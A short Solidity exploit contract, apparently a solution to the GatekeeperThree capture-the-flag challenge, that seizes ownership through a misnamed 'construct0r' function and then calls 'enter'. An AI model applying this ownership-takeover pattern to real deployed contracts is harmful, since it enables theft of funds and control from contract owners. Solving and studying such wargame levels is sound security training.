// SPDX-License-Identifier: MIT
pragma solidity 0.8.10;

import "./GatekeeperThree.sol";

contract Attack {
    function getOwnership(GatekeeperThree _gatekeeper) external {
        _gatekeeper.construct0r();
    }

    function attack(GatekeeperThree _gatekeeper) external {
        _gatekeeper.enter();
    }
}
